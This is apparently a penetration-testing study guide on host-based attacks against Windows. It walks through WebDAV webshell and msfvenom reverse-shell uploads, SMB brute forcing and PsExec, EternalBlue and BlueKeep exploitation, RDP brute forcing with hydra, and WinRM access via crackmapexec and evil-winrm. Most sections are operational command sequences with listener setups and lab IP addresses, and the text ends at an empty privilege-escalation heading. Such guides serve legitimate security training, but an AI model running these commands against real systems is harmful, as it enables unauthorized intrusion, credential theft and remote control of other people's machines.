##### Table Of Contents
1. [Windows Vulnerabilities](System_Host%20Based%20Attacks.md#windows-vulnerabilities)
2. [Exploiting Windows Vulnerabilities](System_Host%20Based%20Attacks.md#exploiting-windows-vulnerabilities)
	- IIS and WebDav
	- SMB Exploitation with PsExec
	- EternalBlue
	- RDP
	- BlueKeep
1. [Windows Privilege Escalation](System_Host%20Based%20Attacks.md#windows-privilege-escalation)
2. [Windows File System Vulnerabilities](System_Host%20Based%20Attacks.md#windows-file-system-vulnerabilities)
3. [Windows Credential Dumping](System_Host%20Based%20Attacks.md#windows-credential-dumping)
4. [Linux Vulnerabilities](System_Host%20Based%20Attacks.md#linux-vulnerabilities)
5. [Exploiting Linux Vulnerabilities](System_Host%20Based%20Attacks.md#exploiting-linux-vulnerabilities)
6. [Linux Privilege Escalation](System_Host%20Based%20Attacks.md#linux-privilege-escalation)
7. [Linux Credential Dumping](System_Host%20Based%20Attacks.md#linux-credential-dumping)


---

## Introduction

System/host-based attacks are specialized attacks targeting specific systems running operating systems like Windows or Linux. These attacks typically occur after gaining access to a network and focus on exploiting inherent vulnerabilities or misconfigurations in servers, workstations, or laptops. Unlike network-based attacks, system-based attacks require a deeper understanding of the target operating system and its specific vulnerabilities. While network services are common attack vectors, system/host-based attacks highlight the importance of focusing on internal OS vulnerabilities once inside the network.

# Windows-Vulnerabilities

The various OS versions makes the threat surface fragmented since some vulnerabilities  that exist in on OS might not be present in another. All Windows versions share common issues:
- The OS is built in C, making them prone to buffer overflows, arbitrary code exec etc. 
- Vulnerable to cross platform vulnerabilities (ie SQL Injection attacks)
- Vulnerable to physical attacks (theft, malicious usb devices)
### Common Windows Vulnerability Types

- **Information Disclosure:** Allows unauthorized access to sensitive data.
- **Buffer Overflows:** Caused by programming errors, allowing malicious code to overwrite memory and potentially execute malware or provide remote access.
- **Remote Code Execution:** Lets attackers execute code remotely on the system.
- **Privilege Escalation:** Allows attackers to elevate privileges post-compromise, often due to misconfigurations.
- **Denial of Service (DoS):** Overloads system resources, preventing normal operation.
### Commonly Exploited Windows Services

- **Microsoft IIS** (TCP 80/443): Web server software used on Windows.
- **WebDAV** (TCP 80/443): HTTP extension for file management on web servers.
- **SMB/CIFS** (TCP 445): File sharing protocol for local networks.
- **RDP** (TCP 3389): Remote access protocol used for GUI-based interactions with Windows systems.
- **WinRM** (TCP 5986/443): Windows remote management protocol for executing remote commands.

# Exploiting-Windows-Vulnerabilities


### IIS-and-WebDav

**IIS (Internet Information Services)** is a web server developed by Microsoft for the Windows NT family. It can be used to host static and dynamic websites and web apps developed in  ASP.NET/ PHP and provides a GUI for managing websites. Typically running on ports 80 and 443, IIS handles executable file extensions like `.asp`, `.aspx`, `.config`, and `.php`.

**WebDAV (Web-based Distributed Authoring and Versioning)** is an extension of HTTP that allows users to  edit/manage files on web servers, essentially turning a web server into a file server. It can run on top of IIS, Apache etc over ports 80/443 and requires authentication via a username and password to connect.
#### WebDAV Exploitation

1. Identify if WebDAV is configured on the IIS server.
2. Check if authentication is needed for WebDAV.  When WebDAV is running on a Windows host, sometimes it doesn't have any authentication. If it does, perform a brute-force attack to find valid credentials for authentication.
3. Use the credentials to upload a malicious .asp payload, enabling command execution or a reverse shell on the target.

#### Initial Nmap Scan

Goal: See if WebDav is enabled, what directory is it enabled on and if authentication is needed

Can run an initial scan to get general information on the target

```
nmap -Pn -sV -sC <target>
```

- `-Pn` = Port scan without ping 
- `-sV`  = Service version check
- `-sC` = Important Here: Runs additional scripts on each port to enumerate information.
- Note: Not specifying port options means nmap will scan the top 1000 most common ports

The `-sC` options is helpful since it can tell if WebDAV is enabled using scripts like '*http-webdav-scan*'. This might not show the directories that WebDav is enabled on, so we can run an additional Nmap script scan using the `http-enum` nmap script against the port WebDav is running (80/443) to confirm the directory and if authentication is enabled:

```
nmap -sV -p80 --script=http-enum <target>
```

The http-enum script should return some helpful information like <u>the directory webdav might be enabled on</u>. If you get a response like `401 Unauthorized` then authentication has been enabled on the WebDav server. You can manually check that location in the browser.

```
http://target/listed_webdav_directory/
```

**Performing a Brute Force Against WebDav** 

We can use `hydra` to perform the brute force against the WebDav service. Be careful of the performing a brute force on any service since it could cause a DoS (Denial of Service). Be aware that wordlists might not have the credentials you're looking for so you'd want to perform more reconnaissance to confirm the users that will have access to WebDav. For the passwords, there's a lot of wordlists out there that might provide the actual credentials.

```
hydra -L users_file -P passwords_file <target> http-get <webdav_directory>
```


Example: 

```
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.41.42.41 http-get /webdav/
```


#### Davtest

Davtest is a WebDAV scanner used for scanning, authenticating, and exploiting WebDAV servers. Used for checking if authentication is enabled, authenticate with it and run checks to show what can be done for exploitation.  Davtest comes pre-installed on most penetration testing distributions like Kali and Parrot OS.


**Authentication**

```
davtest -url <target_location>
```
- `-url` = url of DAV location

Example:
```
davtest -url http://10.16.25.85/webdav
```

An `Unauthorized` response would mean valid credentials is required.

To provide the creds, use the `-auth` option and then include  `username:password`:
```
davtest -auth <user>:<password> -url <target__location>
```

Example:
```
davtest -auth admin1:412pass -url http://10.16.25.85/webdav
```

The  results for DavTest will have the following checks show in the output
1. **Testing DAV Connection** = Authenticates WebDav and creates a random string for the session (like `E93ge9fF39Giz`) which is  appended to any directory or file that is created
- `http://10.16.25.85/webdav`
	- Also creates a random string for the session (like `E93ge9fF39Giz`)
2. **Creating creating** | Tries creating a directory
- `http://10.16.25.85/webdav/DavTestDir_E93ge9fF39Giz` 
3. **Sending test files** | Tries uploading test files like txt,jsp,aspx etc)   
- `http://10.16.25.85/webdav/DavTestDir_E93ge9fF39Giz/davtest_E93ge9fF39Giz.aspx` 
4. **Checking for test file execution:** Tests the execution of each type of file that was uploaded. Important to see which types of files can be executed on the server.
	- <u>Asp would be good for generating an asp payload or uploading an asp webshell which can be accomplished by cadaver.</u>

### Cadaver

Cadaver is a tool for WebDAV clients that lets us upload and download files from the WebDav directory. Also comes pre-installed on most penetration testing distributions like Kali and Parrot OS.
```
cadaver <target_location>
```

Example:
```
cadaver http://10.16.25.85/webdav/
```

You'd then be promoted for the username and password

```
Username: user
Password: rando_pass
```

You be given the a psuedo shell to interact with the server | `dav:/directory/>`

##### Upload the Webshell using Cadaver

We can upload a webshell to get some kind of command execution on the target system. A webshell is a script or program uploaded to a web server, which can allow us to remotely execute commands, manipulate files, or access the server's resources. It essentially serves as a backdoor, giving us control over the server.  

1. **Find the Webshell:** Kali Linux comes pre-packaged with various webshells grouped by programming languages including `asp, aspx, cfm, jsp, perl, php `. They can be found in:
```
/usr/share/webshells/
```

Kali has a webshell for asp located at :
```
/usr/share/webshells/asp/webshell.asp
```

2. **Upload the Webshell to the WebDav server**: This can be uploaded through cadaver to the WebDav Server using a PUT command:
```
put /usr/share/webshells/asp/webshell.asp
```

3. **Execute the Webshell script:**  Once the webshell has been uploaded, navigate to that  file location in the WebDav directory it was uploaded to from the browser. So, if it was uploaded to `/uploads/` you'd visit `http://targetsite.com/uploads/webshell.asp` from the browser, click on the file to trigger the script.
4. **Interact with the Server**:  Webshells normally comes with a user-friendly interface like input fields/search boxes that allows attackers to interact with the compromised server. After executing the `webshell.asp` script, there should be a search box which would let you run commands on the target system where the output would. We can do anything like searching for files, executing shell commands, or navigating directories. 

- List directory content with `dir`
```
dir C:\
```

- Print out file contents
```
type C:\flag.txt
```

### Exploiting WebDav With Metasploit
We're trying to get a meterpreter session(reverse shell) on the target using Metasploit

1. Perform an initial `nmap` scan to check if Webdav is available on the target using the `http-enum` nmap script:
```
nmap -sV -p80 --script=http-enum <target>
```

#### Generating payload using MSFVenom

MSFVenom is used for generating payloads for reverse shells or remote access. We'll generate a reverse_tcp asp payload here. The cmd for msfvenom will need to pick the `-p` payload option, set the `LHOST`/`LPORT` to the IP & local port where the payload will connect back to, the payload's file type `-f` and its name. The payload should be stored in the home directory:

Syntax:
```
msfvenom -p payload LHOST=atk_machine LPORT=l_port -f file_type > file_name
```

Example:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.15.12.2 LPORT=1234 -f asp > shell.asp
```

**Note**: If you're not familiar with the target's architecture for `windows/meterpreter/reverse_tcp`, it's recommended to use the x86(32-bit) architecture since it would work for with 32-bit or 64-bit.

##### Upload the Msfvenom Payload using Cadaver

We'll use Cadaver to upload the payload, enter the webdav location on the target and enter the credentials(if needed):
```
cadaver <target_location>
```

Example:
```
cadaver http://10.16.25.85/webdav/
```

```
Username: user
Password: rando_pass
```

You be given the a psuedo shell to interact with the server | `dav:/directory/>`

Here, we'll upload the payload made by msfvenom using a `PUT` command:
```
dav:/<webdav_directory/> put payload
```

Example:
```
dav:/webdav/> put /root/shell.asp
```

### Setup a listener for the payload using the multi/handler module

We'll need to setup a handler that would wait for the connection from the payload which the `multi/handler` module can be used for.

1. **Start Postgresql and Metasploit** 
```
service postgresql start && msfconsole
```

2. **Use the module**
```
msf6> use multi/handler
```

3. **Configure the module:** Set the configured payload to the one set from msfvenom. For this example, we used `windows/meterpreter/reverse_tcp`. Next, we'll need to set the `LHOST`/`LPORT` to the same one specified in the payload:

```
msf6> set payload windows/meterpreter/reverse_tcp

msf6> set LHOST 10.15.12.2

msf6> set LPORT 1234
```
4. **Run the module**: This will start the listener. When the payload is executed on the target it will connect back here.

```
msf6> run
```

5. **Execute the Payload :**  Navigate to that  file location in the WebDav directory that the payload was uploaded to from the browser. So, if it was uploaded to `/uploads/` you'd visit `http://targetsite.com/uploads/shell.asp` from the browser, click on the file to trigger the script. This should start meterpreter session.


## Automate the process using MSF Modules

We can use the `exploit/windows/iis/iis_webdav_upload_asp` module to upload a meterpreter asp file onto the webdav server which would automate the payload creation/upload process to get a meterpreter session.

1. First, we can search for `iis upload` or just use the module: 
```
search iis upload
```

```
use exploit/windows/iis/iis_webdav_upload_asp
```

2. **Configure the module**: We'll need to provide the username/password for the WebDav server using the `HttpUsername`/`HttpPassword` settings. Also, need to set the target address with `RHOSTS` and then set the `PATH` option to the filename and location where you want to upload the asp file to:
```
set HttpUsername person1
set HttpPassword password9881
set RHOST 10.65.4.88
set PATH /webdav/metasploit.asp
```
3. **Run the exploit**: This should start the meterpreter session
```
exploit
```



## SMB-Exploitation-with-PsExec

SMB (Server Message Block) is a network file-sharing protocol used primarily for sharing files, printers, and other peripherals within a local network. Initially, SMB ran over NetBIOS using port 139 but has since migrated to operate over TCP on port 445. SAMBA is the open-source implementation of SMB on Linux, which allows interoperability with Windows systems, enabling file and device sharing.
##### SMB Authentication Process

The SMB protocol uses two levels of authentication:
- **User Authentication**: Users provide a username and password to access a network resource.
- **Share Authentication**: Users provide a password to access specific, restricted shares.

Both methods rely on the NTLM (NT LAN Manager) challenge-response protocol to securely authenticate without sending the password over the network:
1. <u>Client Sends Username</u>: The client sends its username to the server.
	- *Client sends `"user1"` to the server.*
2. <u>Server Sends a Challenge</u>: The server responds with a unique, random challenge back to the client.
	- *Server sends `XYZ789` to the client.*
3. <u>Client Hashes the Password</u>: The client hashes the user’s password using the NTLM algorithm.
	- *Password `MyPassword123` is hashed to `8F29A0B676...`.*
4. <u>Client Encrypts the Challenge</u>: The client uses the NTLM-hashed password as a key to encrypt the server’s challenge. This is symmetric encryption, where the same secret (hashed password) is shared between client and server.
	- *The client encrypts `XYZ789` with the hash `8F29A0B676...` , producing `D4E8F6A2...`.*
5. <u>Client Sends Encrypted Response</u>: The client sends the challenge encrypted using the NTLM hashed password  challenge back.
	- *Client sends `D4E8F6A2...` to the server.*
6. <u>Server Verifies the Response</u>: The server encrypts the challenge it sent using the NTLM hash of the password for the account as a key, just like the client did. It then compares the result to the client’s response. If they match, authentication succeeds.
	- *The server encrypts `XYZ789` using the stored hash. If the result matches `D4E8F6A2...`, authentication succeeds.*

##### PsExec 

PsExec is a remote command execution tool developed by Microsoft to replace telnet, allowing administrators to execute commands on remote Windows systems using valid user credentials.  PxExec operates over SMB for authentication, using the provided credentials to run processes remotely, including launching command prompts or executing scripts.

Unlike Remote Desktop Protocol (RDP), which provides graphical control over the target system, PsExec focuses on command-line interactions, allowing commands to be run directly without GUI access.

##### SMB Exploitation with PsExec

To exploit SMB using PsExec, attackers typically aim to obtain legitimate credentials, such as a username and password or password hash. This can be achieved through techniques like SMB login brute-force attacks, focusing on common Windows user accounts (e.g., **Administrator**).

Once valid credentials are obtained, the attacker can authenticate with the remote system via PsExec and execute arbitrary commands or initiate a reverse shell. This effectively gives the attacker command-line control over the system, allowing them to perform malicious activities or further escalate their privileges within the network.


1. **Initial Nmap Scan**: Use the `-sV` flag to get the service version and `-sC` to run the default nmap script scans. If you get results like `smb2..` we can authenticate the SMB service using PsExec
```
nmap -sV -sC target
```

2. **Perform SMB Brute Force**: This can be done through the smb_login metasploit auxiliary module. Start PostgreSQL and Metasploit `service postgresql && msfconsole`, then either just search for `smb_login` or just use `auxiliary/scanner/smb/smb_login`. 

```
### (Optional) search smb_login ###

use auxiliary/scanner/smb/smb_login
```

1. Configure the Smb_login module: We'll need to provide the `RHOSTS` for the target. We could provide `SMBDomain` if the target is domain-joined including the domain account and password with `SMBUser`/`SMBPass`. Since we're performing a brute-force, we'll need to set the `USER_FILE` and `PASS_FILE` file, some sample wordlists are:
	- Users: `/usr/share/metasploit-framework/data/wordlists/common_users.txt`
	- Passwords: `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
We also want to just see the successful logins so we can also set the `VERBOSE` option to false.
```
set RHOSTS 10.33.60.54

set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt

set USER/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

set VERBOSE false
```

Run the module using `run`. Keep track of any Administrator accounts.

#### Psexec Python Script

Psexec is a windows executable which can't be ran on a Linux system. We can use the `psexec.py` which is a python implementation of the software. 

```
psexec.py Username@Target <cmd_to_execute_on_system>
```
Example: You can run psexec.py against the target and try to execute a shell using cmd.exe:
```
psexec.py Administrator@10.63.45.88 cmd.exe
```

#### PsExec Metasploit Module

The psexec exploit module `exploit/windows/smb/psexec`  will authenticate through psexec to smb and then upload a meterpreter payload.  This is installing software on the target so be aware of Antivirus solutions which could detection the software as malicious.

1. <u>Find/Use the module</u>: Can just search for `psexec` and select the psexec exploit or `use exploit/windows/smb/psexec `. The payload will probably be set to `windows/meterpreter/reverse_tcp` which 32-bit but its fine:
```
#### search psexec ####

use exploit/windows/smb/psexec
```
3. <u>Configure the module</u>: We'll need to set the target with `RHOSTS` and then the `SMBUser`  and `SMBPass` of the account. You can also configure the payload which you can set to your machine `LHOST` & `LPORT`.

```
set RHOST target
set SMBUser <username>
set SMBPass <password>
```
4. Run the exploit using just `exploit`. This should start a meterpreter session when done.


### EternalBlue

EternalBlue (CVE-2017-0144) is a Windows vulnerability developed by the NSA that exploits a flaw in the SMBv1 protocol, allowing attackers to remotely execute code by sending crafted packets. It can lead to reverse shells or meterpreter sessions and includes automatic privilege escalation. The vulnerability gained notoriety during the **WannaCry ransomware attack** in 2017, which used EternalBlue to spread across networks, infecting Windows systems. EternalBlue impacts various Windows versions, including Vista, 7/8.1/10, and Windows Server 2008/2012/2016, particularly effective on Windows 7/8.1 and Server 2008/2012. A patch was released in March 2017, though many systems remain unpatched.

Metasploit offers an **auxiliary module** to check for vulnerable systems and an **exploit module** to target unpatched systems, providing privileged access and a meterpreter session.

#### Initial Nmap Scan to Check if Vulnerable to Eternal Blue

Run an Nmap scan to identify open ports but we're mainly interested in SMB which is 445. Include the  `smb-vuln-ms17-010` Nmap script to check if the target is vulnerable to the Eternal Blue exploit:

```
nmap -sV -O -p445 --script=smb-vuln-ms17-010 target
```

- `-sV`= Checks the version of services
- `-O` = Checks Operating system | Will confirm what version of windows is running
- `-p 445` = Port 445

If the system is vulnerable, we can execute the exploit.
#### Option A.) Manual Exploitation of Eternal Blue

###### Manual Exploitation Process: 
1. <u>Generate Shellcode/Payload</u>: To exploit EternalBlue using AutoBlue, we first need to generate shellcode payload, that gives us a reverse shell after the SMB vulnerability has been exploited.
2. <u>Setup listener</u>: Once that's generated, we'll need to setup our netcat listener
3. <u>Run the python exploit</u>: Run the python exploit script (`eternalblue_exploit*.py`) specify the target IP and the shell code we would like to exploit then we should get a reverse shell on the netcat listener

**Autoblue** is an automated script used to exploit the EternalBlue vulnerability (CVE-2017-0144), without the need for Metasploit.   You can clone the AutoBlue repository (https://github.com/3ndG4me/AutoBlue-MS17-010): 
```
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
```

The folder will contain:
1. Python exploit files for each version of Windows
	- `eternalblue_exploit7.py` (and server 08)
	- `eternalblue_exploit8.py` (and 8.1)
	- `eternalblue_exploit10.py`
2. requirements.txt  - Helpful for getting python dependencies installed
```
pip install -r requirements.txt
```
3. 'shellcode' directory: Will have the script we need for creating the payload
##### Generating Shell Code

We're going to run the bash script `shell_prep.sh` under the `shellcode` directory of the package (`../EternalBlue/AutoBlue-MS17-010/shellcode`). 

1. **Double-check permission**:Make sure to add execution permissions to the script before attempting to run it:
```
chmod +x shell_prep.sh
```
- `+x` = Adds execution permission onto the script

2. **Execute the script**
```
./shell_prep.sh
```

3. **Respond to  'Eternal Blue Windows Shellcode Compiler' prompt**:  Should get the prompt `...would you like to auto generate a reverse shell with msfvenom (Y/n`. **msfvenom** is a tool that generates payloads, which are small pieces of code sent to a target system once it's compromised. In this case, it will create a **reverse shell**, which means the compromised system will initiate a connection back to an attacker's machine (us), allowing remote control. We'll say `yes` here.

- Set your machine's IP for `LHOST` (Local Host)
```
LHOST for reverse connection: 
10.23.25.45
```
- Set you listening ports of your machine for the payloads:
```
LPORT you want x64 to listen to:
1234
LPORT you want x86 to listen to:
1234
```
- Specify if you want to generate a meterpreter shell or regular cmd shell (We'll choose 1)
```
Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
1
```
- Specify if you want to generate a staged or stageless payload: A **non-staged (stageless) payload** sends the entire payload all at once, whereas  staged payloads sends a small piece first before sending the rest. 

```
Type 0 to generate a staged payload or 1 to generate a stageless payload
1
```

- **Generate the payload**: It will take to some to generate the shellcode but it would be saved  in the shellcode directory. **The payload will be exported into a bin file (ie `sc_x64_msf.bin`) which is where the shell code is saved.** Once its generated, we should be able to execute either the x64 or x86 shell code depending on the target OS's architecture.  Now we can setup our netcat listener.
##### Set up Netcat Listener 
Netcat (often abbreviated as **nc**) is a networking tool used for tasks like port scanning, file transfers, and establishing connections between computers. One of its key features is the ability to set up a listener, which waits for incoming connections on a specified port. To set up a basic listener in Netcat, you would use the command `nc -l -p <port>`, where the **-l** flag tells Netcat to listen and **-p** specifies the port number. 

```
nc -nvlp 123
```
- `-l`: Listener | This tells Netcat to listen for incoming connections 
- `-p 1234`: Specifies the port number to listen on, which in this case is port 1234.
- `-n`: (Optional) | Tells Netcat not to resolve hostnames (use raw IP addresses instead). This speeds things up and avoids DNS lookups.
- `-v`:  (Optional) Runs Netcat in **verbose** mode, providing detailed output

This creates a simple server that will wait for incoming data or connections on the chosen port. We'll need to keep the tab open and wait for the shell. With the listener setup, now we can run the python executables for the exploit.

##### Running the Exploit

1. We're going to run the bash script `shell_prep.sh`. Make sure to add execution permissions to the python script before attempting to run it:

```
chmod +x eternalblue_exploit7.py
```
- `+x` = Adds execution permission onto the script

2. **Execute the script**: Specify the `eternalblue_exploit*.py` script, target and then the binary file for the shellcode
```
python eternalblue_exploit_py target shellcode_binary
```

Example
```
python eternalblue_exploit7.py 10.82.54.22 shellcode/sc_x64.bin
```

If you go back to the netcat listener, you'll see the cmd-shell open from it.

### Option B.) Exploit with Metasploit

1. Open `msfconsole`
```
msfconsole
```

2. Search for the Eternal Blue exploit:  There's an auxiliary module (auxiliary/scanner/smb/smb_ms17_010) that tells you if the system is vulnerable and a exploit module `exploit/windows/smb/ms17_010_eternalblue`. Go and select the exploit....
```
search eternalblue

use exploit/windows/smb/ms17_010_eternalblue
```
3. Configure and run the exploit module: Mainly just need to set the target and your machine's IP and local port.
	- `RHOSTS` = Target system 
	- `LHOST`/`LPORT` | Your system's local host IP and its listening port

```
set RHOSTS 10.82.54.22 
```

After configuring changes, run the exploit using `exploit`. The exploit is done and a meterpreter session should be established. The username allowed should be NT AUTHORITY\\SYSTEM


### RDP

The Remote Desktop Protocol (RDP), developed by Microsoft, is used to remotely connect and interact with Windows systems. By default, it operates on TCP port 3389, though it can be configured to use other ports. Its common common that RDP could be running on a different port. RDP authentication requires a valid user account and the associated password in clear text. <u>We can exploit RDP by performing brute-force attacks to identify valid user credentials  and gain remote access to the target</u>. 

1. **Perform an initial Nmap scan against the target**: Make sure to scan the entire TCP port range `-p-` since RDP could be configured on a different port. Can also ran this as a SYN Scan `-sS` to make this more stealthier.
```
nmap -sV -O -sS -p- target
```

If you don't see a RDP confirmed on port 3389 or as a service you have two options:
- **Option A**: Connecting directly to RDP on that target and specify the port you believe to be for RDP
- **Option B**: Run the metasploit RDP scanner to confirm if RDP is available on the system.


#### Checking for RDP using Metasploit

We can use the rdp_scanner auxiliary module which would check the ports to see if it can communicate using RDP:

1. Start Postgresql/Metasploit console:
```
service postgresql && msfconsole
```
2. Either search for `rdp_scanner` or use `auxiliary/scanner/rdp/rdp_scanner` 
```
search rdp_scanner

use auxiliary/scanner/rdp/rdp_scanner
```
3. **Configure the module**: We'll need to set the target address using `RHOSTS` and then specify the `RPORT` to a port we believe RDP is running on.

```
set RHOSTS 192.168.41.2

set RPORT 4876
```

4. **Run the scanner**: Use `run` to execute the scanner, it should return build number and some other hostname information of the target also. After getting a confirmation of RDP running on the target, we can brute force to find credentials.

##### Perform Brute Force using Hydra

Hydra can be used here to perform a brute force against the RDP service on the target. Be aware that this could cause a DoS event so the speed of the brute force might need to be adjusted depending on the environment. You need to specify the user name list `-L`, the password list `-P` the protocol like for RDP it would be `rdp://` and the port number `-s`.

- Example User Wordlist: `/usr/share/metasploit-framework/data/wordlists/common_users.txt`
- Example Password Wordlist: `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`

```
hydra -L user_list  -P  password_list  protocol://target -s port_number 
```

Example:
```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P  /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.42.2.41 -s 3333 
```

Hydra will try to actually to connect with any valid credentials using the freerdp client. We'll be using `xfreerdp` to actually connect to the target system.

#### Connect to the Target using XfreeRDP

**xfreerdp** is an open-source client used for connecting to a remote desktop server using the Remote Desktop Protocol (RDP). It is part of the FreeRDP project and is commonly used in Linux environments to connect to Windows machines. We need to specify the username `/u:` the password `/p:` , the target `/v:` and its port number:

```
xfreerdp /u:username /p:password /v:target_ip:rdp_port_number
```

Example:
```
xfreerdp /u:administrator /p:qwertyuiop /v:10.24.5.1:3333
```

This will return the RDP GUI windows for the target.

## BlueKeep

BlueKeep (CVE-2019-0708) is a inherent remote code execution vulnerability in the Windows RDP protocol, publicly disclosed by Microsoft in 2019. Instead of brute forcing for valid user accounts, the vulnerability exploits a flaw in the RDP protocol itself by <u>gaining access to a chunk of kernel memory</u> and remotely executing arbitrary code at the system level without authentication. Attackers specifically target the kernel because it operates in a highly privileged space, so any code ran there will inherit elevated privileges. For instance, executing a meterpreter payload in the kernel would grant a session with elevated access. However, executing code at the kernel level also carries the risk of causing system instability or crashes. Microsoft released a patch for this vulnerability on May 14th, 2019. The BlueKeep vulnerability affects multiple versions of Windows XP/Vista/7 and Windows Server 2008 & R2.

The exploit will fail unless the following prerequisites are met:
1. RDP needs to be enabled
2. Network-level authentication (NLA) can't be enabled

The BlueKeep vulnerability has illegitimate proof of concepts (PoCs) and exploit code that could be malicious, potentially performing tasks unrelated to the exploit itself. Microsoft did not release public PoCs or exploit code for BlueKeep, as doing so would have worsened the vulnerability's impact. Security researchers created PoCs without payloads, demonstrating the vulnerability by performing non-malicious actions like creating files, rather than executing reverse shells. It's recommended to only use verified exploit code to avoid malicious variants.

The BlueKeep exploit includes an MSF auxiliary module to check if a system is vulnerable and an exploit module to target unpatched systems. However, the exploit requires adjustments based on the Windows version and the memory chunk size needed to execute the code. When successful, the exploit provides a standard command shell or a meterpreter session on the target.

1. Perform a port scan to confirm if RDP is running on the target:
```
nmap -p 3389 target
```
2. Run the metasploit auxiliary module to confirm if the version of RDP is vulnerable. Start metasploit with `msfconsole`, and then search '`Bluekeep`':
```
search Bluekeep
```
The results will have the auxiliary module `auxiliary/scanner/rdp/cve_2019_0708_bluekeep` and the exploit, the exploit will also run the aux scanner module. 
```
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
### or "use 0/1" ##
```
Make any configuration changes for the scanner
- `RHOSTS` = The target host
- `RPORT` = Change if RDP is running on a different port from its default
```
set RHOSTS 10.69.65.2
```
Type `run`  to start the scan
```
run
```

Run the exploit:

We can select the exploit `exploit/windows/rdp/cve_2019_0708_bluekeep_rce` 
```
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
### or "use 0/1" ##
```

Configure the module options:
- `RHOSTS` = The target host
- `RPORT` = Change if RDP is running on a different port from its default
```
set RHOSTS 10.69.65.2
```

Configure the payload options 
- `LHOST` (Listening Host) = Your local machine
- `LPORT`(Listening Port) = The port on your system to listen

Just type `exploit`  to run the exploit
```
exploit
```

Might get a `bad-config` response if you don't specify a target, the module gives the ability to specify the target configuration or version of Windows to target

```
show targets
```

Set target to whatever the ID of the OS running on the target
```
set target 2
```

Part of the output would include something along the lines of `Using CHUNK Grooming strategy. Size 250MB, target address 0xfffffx8011e07000, Channel count 1`.

**Grooming** is the process of preparing a system’s memory or other states to manipulate how resources—such as memory blocks or file handles—are allocated or managed. The goal of grooming is to position vulnerable memory segments in predictable locations, making it easier for an exploit to succeed by taking advantage of these weaknesses.

A common form of grooming is **chunk grooming**, which specifically targets heap memory. The **heap** is a region of memory used for dynamic allocation during the runtime of programs. It's structured into units called **chunks**, which vary in size. Chunk grooming involves controlling how these chunks are allocated and placed, ensuring that vulnerable memory blocks are aligned in a way that increases the likelihood of a successful attack.

In this case, the groomer reserves large blocks of memory in RAM —such as the `250MB` mentioned in the output. By doing so, it forces the operating system to place the vulnerable memory segment (at the address `0xfffffx8011e07000`) in a location that the attacker can predict. Without this grooming, memory could be allocated randomly, which would make it much harder for the exploit to reliably target and manipulate the vulnerable segment. By carefully "grooming" the memory layout, the attacker increases the likelihood that their code will be successfully executed. 

You can try adjusting the size of memory used if this fails.

After the exploit is done, the meterpreter session should be allowed. This works like EternalBlue where we didn't need to elevate our privileges to get admin access. 


## WinRM

WinRM (Windows Remote Management ) is a protocol developed by Microsoft to enable remote access and management of Windows systems over HTTP or HTTPS, simplifying tasks for system administrators. It is commonly used to interact with Windows hosts on a network, execute commands remotely, and manage system configurations. Can login by providing the target IP and then a username with the account password or a password hash. WinRM operates over TCP ports 5985 (HTTP) and 5986 (HTTPS) and incorporates security measures such as access control and authentication.

Tools like _crackmapexec_ can be used to perform brute-force attacks on WinRM to discover user credentials and execute commands on target systems. Additionally, _evil-winrm_, a Ruby script, allows users to establish a command shell session on the target machine.


1. **Perform the initial Nmap scan**: Make sure to either scan the entire TCP port range `-p-` or just the 5985/5986 ports. Windows doesn't have a specific banner for WinRM so don't be too concerned with the service name listed for the port.

```
nmap -sV -p5985,5986 target
```

#### Crackmapexec

The _crackmapexec_ tool can be used for cracking various protocols including winrm.
- Available protocols: `ssh | winrm | smb | rdp | mssql | ldap | ftp`

General Brute Force Syntax: 
```
crackmapexec <protocol> -u <user_or_user_wordlist> -p <password_or_password_list>
```

Example:
```
crackmapexec winrm -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

We'd target the administrator account since we'll know its automatically there
also the administrator is typically used by system administrators here and we wouldn't need to perform privilege escalations later.

If there's a match the brute force will display `(Pwn3d!)` and stop the brute force. Now we can use the credentials to execute commands on the target
##### Execute Commands


We can use the `-x` options which can be used to execute commands on the target like `systeminfo` to collect information:

```
crackmapexec winrm -u administrator -p pqaeoirgq -x "systeminfo"
```

### Get a command shell using Evil-WinRM

**Evil-WinRM** is a tool used for post-exploitation, allowing attackers to remotely connect to and execute commands on a Windows system via WinRM. The core script, **evil-winrm.rb**, written in Ruby, automate tasks like remote command execution, file transfers, and script execution on compromised systems. This makes it a go-to tool for penetration testers and red teamers in offensive security scenarios.

- **Link to GitHub:** https://github.com/Hackplayers/evil-winrm

```
evil-winrm.rb -u administrator -p "pqaeoirgq" -i 10.52.6.4
```
- `-u`= Username
- `-p` = Password
- `-i` = Target

### Exploitation of WinRM using Metasploit

We can use the winrm_script_exec exploit module (`exploit/windows/winrm/winrm_script_exec`) for exploiting WinRM, you would need to have valid credentials for this to work so enumeration/brute force would be necessary first:

1. **Start Postgresql and the Metasploit Console**
```
service postgresql start && msfconsole
```

2. **Configure the module**: By default the payload will be `windows/meterpreter/reverse_tcp` which is 32-bit and fine here. Need to set the target `RHOSTS` , set the `FORCE_VBS` for the VBS CmdStager to true and then set the `USERNAME`/`PASSWORD`.  The `RPORT` will already be set to 5985 by default.  A **VBS cmdstager** is a the tool will generate and execute commands written in VBScript on a Windows machine to download, write, and execute a payload in stages. This is often used in scenarios where direct execution of a large payload is not feasible, so the payload is staged and executed via small script commands.
```
set RHOSTS 10.52.63.52
set FORCE_VBS true
set USERNAME administrator
set PASSWORD wifpoeij
```
3. **Run the exploit**:  This try to migrate to a System level process like services.exe, wininit.exe, svchost.exe etc for stability but should eventually migrate successfully and get a meterpreter session as  NT AUTHORITY \SYSTEM.
```
exploit
```

# Windows-Privilege-Escalation

### Privilege Escalation

